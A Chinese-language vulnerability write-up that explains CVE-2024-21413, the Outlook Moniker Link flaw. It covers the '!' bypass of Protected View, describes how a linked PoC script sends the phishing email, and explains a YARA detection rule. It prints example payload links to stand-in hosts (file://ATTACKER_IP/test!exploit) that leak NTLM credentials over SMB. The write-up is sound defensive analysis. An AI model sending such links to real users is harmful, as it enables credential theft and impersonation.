- [Moniker Link (CVE-2024-21413)](#moniker-link-cve-2024-21413)
    - [概述](#概述)
    - [漏洞原理](#漏洞原理)
    - [技术细节拆解：](#技术细节拆解)
    - [PoC](#poc)
    - [YARA RULE](#yara-rule)

# Moniker Link (CVE-2024-21413)
https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413

2024年2月13日，微软发布了一个关于 Microsoft Outlook 远程代码执行（RCE）及凭据泄露漏洞的公告，该漏洞的 CVE 编号为 CVE-2024-21413（又被称为 Moniker Link 漏洞）。该漏洞由 Check Point 研究中心的 Haifei Li 发现。
### 概述
- 漏洞原理：
该漏洞通过绕过 Outlook 在处理一种被称为 Moniker Link 的特定类型超链接时的安全机制来发挥作用。
- 攻击手段：
攻击者可以向受害者发送一封包含恶意 Moniker Link 的电子邮件。
- 攻击后果：
一旦用户点击了该超链接，Outlook 就会将用户的 NTLM 凭据发送给攻击者，从而导致敏感信息泄露。

*NTLM 凭据：这是 Windows 用于网络身份验证的一种哈希值。攻击者拿到后可以尝试破解你的密码，或者进行“重放攻击”来假冒你的身份。*
### 漏洞原理
Outlook 可以将电子邮件渲染为 HTML 格式。此外，Outlook 能够解析诸如 HTTP 和 HTTPS 的超链接。然而，它还可以打开指向特定应用程序的 URL，即所谓的 **Moniker Links**。通常情况下，当触发外部应用程序时，Outlook 会弹出安全警告。

这个弹窗是 Outlook “受保护视图”（Protected View） 机制的结果。受保护视图会以只读模式打开包含附件、超链接及类似内容的邮件，从而拦截诸如宏（尤其是来自组织外部的宏）之类的威胁。

通过在超链接中使用 file:// 这种 Moniker Link，我们可以指示 Outlook 尝试访问某个文件，例如网络共享路径上的文件（例如：`<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>"`）。此时会使用**SMB 协议，该协议在身份验证过程中会调用本地凭据**。然而，Outlook 的“受保护视图”通常会检测并拦截这种尝试。


**该漏洞的存在是由于我们在 Moniker Link 超链接中加入了 `!` 特殊字符以及一些额外的文本，这导致了 Outlook “受保护视图”（Protected View） 的失效。**

例如：`<a href="file://ATTACKER_IP/test!exploit">Click me</a>`

### 技术细节拆解：
`!`：在 Windows 的 COM 对象和 Moniker 命名机制中，! 被用作分隔符（Delimiter）。

#### 绕过原理：

安全检查阶段：当 Outlook 的安全过滤机制扫描这个链接时，它可能无法正确解析带有 ! 的路径，或者错误地认为这只是一个普通的文件路径，从而没有触发“受保护视图”的拦截警报。

实际执行阶段：一旦用户点击，系统底层组件在解析该链接时，依然会尝试**通过 SMB 协议** 去连接 file://攻击者IP。

结果：由于安全检查被绕过，Outlook 不再弹出任何警告，直接尝试连接攻击者的服务器，并在后台静默地把用户的 NTLM 凭据（身份验证信息） 送到了攻击者手中。

### PoC
见 [Moniker-Link PoC](../../PoC/CVE-2014-21413-Moniker_Link.py)

#### PoC 流程说明：
- 配置：需要提供攻击者和受害者的电子邮件地址、攻击者的监听端口IP、攻击者使用的的SMTP服务器地址。

- 身份验证：需要密码进行认证。

- 编写邮件内容 (html_content)：在变量 html_content 中填充邮件正文，其中包含我们之前提到的、作为 HTML 超链接的 Moniker Link。

- 填写邮件元数据：填写邮件的“主题”（Subject）、“发件人”（From）和“收件人”（To）字段。

- 发送邮件：最后，脚本将邮件发送至邮件服务器。

### YARA RULE
见 [Moniker-Link YARA](../../YARA/cve-2024-21413.yar)

#### 解释
1. and all of ($a*) —— 确定身份：这是封邮件吗？
含义：要求 $a 开头的所有字符串（即 $a1 和 $a2）必须全部出现。

2. and 1 of ($xr*) —— 发现凶器：里面有毒吗？
含义：要求 $xr 开头的字符串（这里只有 $xr1 这一个正则）只要出现 1 个（或以上）即可。